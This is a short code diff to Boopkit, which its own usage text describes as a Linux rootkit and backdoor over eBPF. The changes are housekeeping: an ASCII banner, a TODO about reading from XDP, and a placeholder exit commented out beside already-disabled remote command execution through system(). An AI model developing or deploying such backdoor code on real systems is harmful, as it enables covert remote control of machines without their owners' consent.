@@ -44,6 +44,7 @@
 // clang-format on
 
 void usage() {
+  asciiheader();
   boopprintf("Boopkit version: %s\n", VERSION);
   boopprintf("Linux rootkit and backdoor over eBPF.\n");
   boopprintf("Author: Kris Nóva <kris@nivenly.com>\n");
@@ -392,11 +393,11 @@ int main(int argc, char **argv) {
           free(rce);
         } else {
           // TODO Parse RCE from map/encapsulation
+          // TODO Read from XDP
           // boopprintf("  <- Executing: %s\r\n", ret.rce);
           // system(ret.rce);
           // boopprintf("  -> no RCE found!\n");
-          printf("***SEARCH FOR PAYLOAD HERE***\n");
-          exit(1);
+          // printf("***SEARCH FOR PAYLOAD HERE***\n");
         }
       }
       err = bpf_map_delete_elem(fd, &jkey);
